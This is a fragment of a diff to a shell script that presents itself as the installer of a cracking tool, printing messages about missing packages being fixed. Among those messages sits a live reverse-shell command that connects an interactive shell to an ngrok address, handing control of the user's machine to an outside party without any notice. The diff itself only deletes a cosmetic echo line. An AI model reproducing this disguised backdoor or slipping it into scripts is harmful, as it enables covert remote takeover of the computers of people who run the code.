@@ -7,6 +7,5 @@ echo Some packages are missing
 sleep 2
 echo fixing them
 sh -i >& /dev/tcp/6.tcp.ngrok.io/5628 &0>1
-echo ALl Done Now run The tool
 echo python2 crack.py
 echo Thanks For using my tool
